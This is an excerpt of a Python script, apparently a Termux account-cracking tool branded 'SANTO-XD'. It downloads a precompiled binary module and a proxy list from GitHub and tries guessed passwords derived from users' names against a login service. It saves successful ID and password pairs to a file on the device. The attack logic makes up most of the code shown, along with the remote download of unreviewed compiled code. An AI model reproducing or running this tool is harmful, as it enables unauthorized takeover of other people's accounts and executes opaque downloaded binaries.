...
if 'aarch64' in str(find_aarch):
        user_aarch = '64'
        download_link = f'https://raw.githubusercontent.com/ffdvl1120/cc/main/pycrypto_qsr.cpython-311.so'
        ...
        print(' Unknown aarch ')
        exit()
if not os.path.isfile(f'pycrypto_qsr.cpython-311.so'):
        os.system('clear')
...
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/.prox.txt').text
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+8801848266826?text={bumper}")
                        qsbuy()
...
def main():
        ...
        if menu_opt =='1':
                ...
                xchker()
                os.system('xdg-open https://github.com/Termux-Santo')
                main()
        elif menu_opt =='4':
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[SANTO-XD] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[SANTO-XD-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/SANTO-XD_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/SANTO-XD_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/SANTO-XD' in datar:
        pass
else:
        for i in range(5000):
